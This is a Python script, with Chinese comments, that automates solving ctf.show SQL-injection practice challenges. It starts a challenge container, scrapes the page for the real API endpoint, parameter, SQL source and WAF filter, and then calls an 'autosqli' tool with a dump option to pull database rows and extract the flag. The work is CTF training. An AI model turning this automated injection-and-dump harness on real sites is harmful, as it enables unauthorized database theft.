"""ctf.show 单题一键作战：boot → 定位真实入口 → 定向分析/脱库 → 一行战报。

为什么需要它：ctf.show 每题容器的真实注入入口不是固定的 `/api/`，而是
`select-no-waf-N.php` 页面里 `action="api/vN.php"` 指定的路径（N 随题号变）。
直接拿 `/api/?id=1` 去打会得到 404 并白白跑完整套探测（web173 实测烧了 163s）。

用法：
  python scripts/ctfshow_battle.py web176
  python scripts/ctfshow_battle.py web176 --verbose      # 打印全部请求日志
  python scripts/ctfshow_battle.py web176 --budget 90    # 单题预算（秒）
"""
from __future__ import annotations

import argparse
import os
import re
import subprocess
import sys
import time
import urllib.parse

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, HERE)

from ctfshow_runner import Api, by_name, challenges, load_cookie  # noqa: E402

RUNS = os.path.join(ROOT, "runs")
FLAG_RE = re.compile(r"(?:ctfshow|flag|CTF|FLAG)\{[^}\s'\"]{1,120}\}")
SQL_RE = re.compile(r"\$sql\s*=\s*\"([^\"]{5,400})\"")
ACTION_RE = re.compile(r'<div[^>]*class="[^"]*layui-form[^"]*"[^>]*action="([^"]+)"')
FALLBACK_ACTION_RE = re.compile(r'action="([^"]+\.php[^"]*)"')
INPUT_RE = re.compile(r'<input[^>]*name="([^"]+)"', re.I)


def http_get(url: str, cookie: str) -> tuple[int, str]:
    import urllib.request
    req = urllib.request.Request(url, headers={
        "Cookie": "session=" + cookie,
        "User-Agent": "Mozilla/5.0 AutoSQLi-battle",
    })
    try:
        with urllib.request.urlopen(req, timeout=25) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def resolve_entry(base: str, name: str, cookie: str) -> tuple[str, str, str, str]:
    """返回 (注入目标 URL, 参数名, 页面里的 $sql 源码, 页面里的 preg_match 过滤代码)。

    步骤：容器首页 → 找 select-*.php 挑战页 → 读 layui-form 的 action
    → 拼出 `action?param=1`。N 优先按题号推算，失败再扫首页链接试。
    """
    base = base.rstrip("/") + "/"
    status, index = http_get(base, cookie)
    if status != 200:
        raise RuntimeError(f"容器首页 {status}，容器可能未就绪")

    m = re.match(r"web(\d+)", name, re.I)
    guess = int(m.group(1)) - 170 if m else 0
    # 入口页链接先收集（web171-175 是 select-no-waf-N.php，web176 起变成
    # select-waf.php，所以不能只靠题号推算）
    links = [p for p in re.findall(r'href="([^"?]+\.php)"', index)
             if "index.php" not in p]
    links = list(dict.fromkeys(links))
    links.sort(key=lambda p: (0 if "select" in p.lower() else 1, p))
    pages = []
    if guess > 0:
        pages.append(f"select-no-waf-{guess}.php")
    pages += links
    pages += sorted(set(re.findall(r'(select-[a-z0-9-]*\d+\.php)', index)),
                    key=lambda p: -int(re.search(r"(\d+)\.php", p).group(1)))

    last_err = "无候选页面"
    for page in pages:
        s, html = http_get(base + page, cookie)
        if s != 200:
            last_err = f"{page} -> {s}"
            continue
        am = ACTION_RE.search(html) or FALLBACK_ACTION_RE.search(html)
        if not am:
            last_err = f"{page} 无 form action"
            continue
        action = urllib.parse.urljoin(base + page, am.group(1))
        im = INPUT_RE.search(html)
        param = im.group(1) if im else "id"
        # 页面写的 action 不一定真实可用（web174 写 api/v2.php，真接口是 api/v4.php），
        # 逐个候选实测：返回 {"code":..} 的才是真接口
        cands = [action, urllib.parse.urljoin(action, "./"), base + page]
        for n in ([guess - 1, guess, guess + 1, guess + 2] if guess else []):
            cands.append(urllib.parse.urljoin(base, f"api/v{n}.php"))
        real = ""
        for cand in dict.fromkeys(cands):
            if not cand:
                continue
            s2, body2 = http_get(f"{cand}?{param}=1", cookie)
            if s2 == 200 and body2.lstrip().startswith('{"code"'):
                real = cand
                break
        if not real:
            last_err = f"{page} 的 action {action} 及候选接口均未返回 JSON"
            continue
        sm = SQL_RE.search(html)
        fm = re.search(r"function\s+waf\s*\([^)]*\)\s*\{([^}]{0,300})\}", html) \
            or re.search(r"preg_match\s*\([^\n]{0,180}", html)
        return (f"{real}?{param}=1", param,
                (sm.group(1) if sm else ""), (fm.group(0) if fm else ""))
    raise RuntimeError(f"定位入口失败：{last_err}")


def stream_cli(url: str, param: str, budget: int, verbose: bool, log_path: str) -> tuple[int, str]:
    cmd = [sys.executable, "-u", "-m", "autosqli.cli", "-u", url, "-p", param,
           "--dump", "--fast", "--max-seconds", str(budget), "--timeout", "12",
           "--workers", "8", "--max-rows", "60"]
    keep = re.compile(r"\[进度\]|注入点|指纹:|\[FLAG\]|\[WARN\]|\[ERROR\]|通道|请求数|"
                      r"脱库结果|已过滤|✗|★")
    out, t0 = [], time.time()
    with open(log_path, "w", encoding="utf-8") as lf:
        p = subprocess.Popen(cmd, cwd=ROOT, stdout=subprocess.PIPE,
                             stderr=subprocess.STDOUT, text=True,
                             encoding="utf-8", errors="replace", bufsize=1)
        for line in p.stdout:
            lf.write(line)
            out.append(line)
            if verbose or keep.search(line):
                text = line.rstrip()
                # 含 flag 的行不截断：战报要能直接复制
                if not FLAG_RE.search(text):
                    text = text[:160]
                print("   " + text, flush=True)
            if time.time() - t0 > budget + 30:
                p.kill()
                print("   ⏱ 超预算强杀", flush=True)
                break
        p.wait()
    return p.returncode, "".join(out)


def wait_ready(base: str, cookie: str, timeout: float = 40.0) -> bool:
    """容器创建后有几秒不可用（首页 404/502），轮询到 200 再解析入口。"""
    t0 = time.time()
    while time.time() - t0 < timeout:
        status, _ = http_get(base.rstrip("/") + "/", cookie)
        if status == 200:
            return True
        time.sleep(2)
    return False


def main(argv=None):
    for stream in (sys.stdout, sys.stderr):
        if hasattr(stream, "reconfigure"):
            stream.reconfigure(encoding="utf-8", errors="replace")
    ap = argparse.ArgumentParser(description="ctf.show 单题一键作战")
    ap.add_argument("name", help="题名，如 web176")
    ap.add_argument("--cookie-file", default=os.environ.get("CTFSHOW_COOKIE_FILE", ""))
    ap.add_argument("--budget", type=int, default=90, help="单题秒数预算（默认 90）")
    ap.add_argument("--verbose", action="store_true")
    args = ap.parse_args(argv)

    cookie = load_cookie(args.cookie_file)
    api = Api(cookie)
    c = by_name(challenges(api, "sql注入"), args.name)
    os.makedirs(RUNS, exist_ok=True)
    log_path = os.path.join(RUNS, f"{c['name']}.log")

    t0 = time.time()
    from ctfshow_runner import ensure_container
    base = ensure_container(api, c["id"])
    print(f"[{c['name']}] 容器 {base}（{(time.time() - t0):.0f}s）", flush=True)
    if not wait_ready(base, cookie):
        print(f"[{c['name']}] ❌ 容器 40s 内未就绪", flush=True)
        return 2

    try:
        target, param, sql, filt = resolve_entry(base, c["name"], cookie)
    except Exception as e:
        print(f"[{c['name']}] ❌ 入口定位失败: {e}", flush=True)
        return 2
    print(f"[{c['name']}] 入口 {target}  参数 {param}", flush=True)
    if sql:
        print(f"[{c['name']}] 源码 {sql[:150]}", flush=True)
    if filt:
        print(f"[{c['name']}] 过滤 {filt[:150]}", flush=True)

    rc, out = stream_cli(target, param, args.budget, args.verbose, log_path)
    flags = list(dict.fromkeys(FLAG_RE.findall(out)))
    tech = re.search(r"通道: (\w+)", out)
    reqs = re.search(r"请求数: (\d+)", out)
    dt = time.time() - t0
    if flags:
        print(f"[{c['name']}] ✅ {flags[0]} | {tech.group(1) if tech else '-'} "
              f"| {reqs.group(1) if reqs else '?'} 请求 | {dt:.0f}s", flush=True)
    else:
        print(f"[{c['name']}] ❌ 未出 flag | rc={rc} | {dt:.0f}s | 日志 {log_path}", flush=True)
    return 0 if flags else 1


if __name__ == "__main__":
    sys.exit(main())
